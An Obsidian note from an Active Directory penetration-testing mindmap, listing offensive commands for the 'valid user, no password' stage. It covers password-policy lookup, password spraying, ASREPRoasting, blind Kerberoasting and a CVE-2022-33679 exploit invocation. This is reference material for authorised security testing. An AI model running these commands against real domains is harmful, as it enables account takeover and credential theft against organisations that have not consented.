---
title: "Valid User (No Password)"
category: recon
color: "#66B2FF"
tags:
  - ad-mindmap
  - recon
  - cve
---

# 👤 Valid User (No Password)

> [!info] Mindmap box `Valid user (no password)`
> Part of the [[AD Mindmap]] — Active Directory Mindmap v2025.03.

## Password Spray

- Get password policy  (you need creds,but you should get the policy  first to avoid locking accounts)
    - default policy
        - `nxc smb <dc_ip> -u '<user>' -p '<password>' --pass-pol` [↗](https://github.com/Pennyw0rth/NetExec) — [ref](https://www.thehacker.recipes/ad/recon/password-policy)
        - `Get-ADDefaultDomainPasswordPolicy` [↗](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy)
        - `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policy` [↗](https://github.com/franc-pentest/ldeep)
    - Fined Policy (Privileged)
        - `ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <pass> --type pass-pols` [↗](https://github.com/yaap7/ldapsearch-ad)
        - `Get-ADFineGainedPasswordPolicy -filter *` [↗](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adfinegrainedpasswordpolicy)
        - `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso # can also be runned with a low priv account but less information will be available` [↗](https://github.com/franc-pentest/ldeep)
- ⚠️ user == password ➡️ [[Valid Credentials|Clear text Credentials]]
    - `nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success` [↗](https://github.com/Pennyw0rth/NetExec)
    - `sprayhound -U <users.txt> -d <domain> -dc  <dc_ip>   # add --lower to lowercase and --upper to uppercase. Add nothing to get only user=pass` [↗](https://github.com/Hackndo/sprayhound)
- ⚠️ usuals passwords  (SeasonYear!, Company123, ...) ➡️ [[Valid Credentials|Clear text Credentials]]
    - `nxc smb <dc_ip> -u <users.txt> -p <password> --continue-on-success` [↗](https://github.com/Pennyw0rth/NetExec)
    - `sprayhound -U <users.txt> -p <password> -d <domain> -dc  <dc_ip>` [↗](https://github.com/Hackndo/sprayhound)
    - `kerbrute passwordspray -d <domain> <users.txt> <password>` [↗](https://github.com/ropnop/kerbrute)

## ASREPRoast

- List ASREPRoastable Users (need creds)
    - `MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u` [↗](https://github.com/SpecterOps/BloodHound)
- ASREP roasting ➡️ [[Crack Hash|Hash found ASREP]]
    - `GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>` [↗](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
    - `nxc ldap <dc_ip> -u <users.txt>  -p '' --asreproast <output.txt>` [↗](https://github.com/Pennyw0rth/NetExec)
    - `Rubeus.exe asreproast /format:hashcat` [↗](https://github.com/GhostPack/Rubeus)
- Blind Kerberoasting ➡️ [[Crack Hash|Hash found TGS]]
    - `Rubeus.exe keberoast /domain:<domain> /dc:<dcip> /nopreauth: <asrep_user> /spns:<users.txt>` [↗](https://github.com/GhostPack/Rubeus)
    - `GetUserSPNs.py -no-preauth "<asrep_user>" -usersfile "<user_list.txt>" -dc-host "<dc_ip>" "<domain>"/` [↗](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
- CVE-2022-33679 `#CVE` ➡️ [[Lateral Movement|Lat move PTT]]
    - `CVE-2022-33679.py <domain>/<user> <target>` [↗](https://github.com/Bdenneu/CVE-2022-33679)
